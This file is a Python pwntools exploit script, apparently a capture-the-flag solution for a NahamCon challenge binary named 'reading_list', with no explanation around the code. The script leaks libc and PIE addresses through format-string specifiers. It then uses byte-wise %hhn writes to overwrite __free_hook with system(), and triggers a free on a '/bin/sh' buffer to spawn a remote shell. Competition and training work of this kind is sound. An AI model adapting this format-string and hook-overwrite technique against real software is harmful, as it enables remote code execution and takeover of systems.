#!/usr/bin/env python3


from pwn import *


e = ELF("./reading_list")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
#r = process("./reading_list")
r = remote("challenge.nahamcon.com",31577)
r.sendlineafter(b"What is your name:",b"Ajay")

def malloc(data):
    r.sendlineafter(b">",b"2")
    r.sendlineafter(b"Enter the book name:",data)

malloc(b"/bin/sh\x00")
malloc(b"%23$p ")
r.sendlineafter(b">",b"1")
r.recvuntil("2. ")
libc_base = int(r.recvline().strip(),16) - 0x240b3
i = 0
malloc(b"%6$p")
r.sendlineafter(b">",b"1")
r.recvuntil(b"3. ")
pie_base = int(r.recvline().strip(),16) - 0x11c0
system = libc_base + libc.sym.system
while(i < 6):
    r.sendlineafter(b">",b"4")
    r.sendlineafter(b"What is your name:",p64(libc_base + libc.sym.__free_hook+i))
    sys = system%256
    system = system>>8
    malloc(f"%{sys}x%14$hhn")
    r.sendlineafter(b">",b"1")
    i+=1

r.sendlineafter(b">",b"4")
r.sendlineafter(b"What is your name:",p64(pie_base + 0x4038))
malloc(f"  %14$hhn")
r.sendlineafter(b">",b"1")
malloc(b"ssad")
r.sendlineafter(b">",b"3")
r.sendlineafter(b"Enter the number for the book you would like to remove",b"1")
r.interactive()
